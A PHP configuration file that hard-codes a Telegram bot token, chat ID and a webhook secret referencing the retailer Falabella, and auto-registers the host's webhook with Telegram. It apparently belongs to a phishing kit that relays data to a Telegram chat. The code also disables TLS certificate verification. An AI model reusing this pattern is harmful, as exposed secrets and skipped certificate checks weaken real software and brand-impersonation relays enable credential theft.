<?php

if (basename($_SERVER['PHP_SELF'] ?? '') === basename(__FILE__)) {
    http_response_code(403);
    exit('Forbidden');
}

$BOT_TOKEN = '8878826469:AAEiQuRQn-PzvPSiL-tKRJ9pw8TmwGpVJ2M';
$CHAT_ID   = '-5594012756';
$WEBHOOK_SECRET = 'FB_SecTok_' . hash('sha256', $BOT_TOKEN . '_falabella_sec');

function auto_sync_telegram_webhook() {
    global $BOT_TOKEN;

    $host = $_SERVER['HTTP_HOST'] ?? '';
    if (empty($host) || strpos($host, 'localhost') !== false || strpos($host, '127.0.0.1') !== false) {
        return;
    }

    $isHttps = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ||
               (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https') ||
               (strpos($host, 'vercel.app') !== false);

    if (!$isHttps) {
        return;
    }

    $currentWebhookUrl = "https://" . $host . "/webhook.php";
    $cacheFile = sys_get_temp_dir() . '/last_tg_webhook_url.txt';

    $lastSavedUrl = file_exists($cacheFile) ? trim(@file_get_contents($cacheFile)) : '';

    if ($lastSavedUrl !== $currentWebhookUrl) {
        $apiUrl = "https://api.telegram.org/bot{$BOT_TOKEN}/setWebhook?url=" . urlencode($currentWebhookUrl);

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $apiUrl);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 3);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 2);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $res = curl_exec($ch);
        curl_close($ch);

        $json = json_decode($res, true);
        if ($json && !empty($json['ok'])) {
            @file_put_contents($cacheFile, $currentWebhookUrl);
        }
    }
}
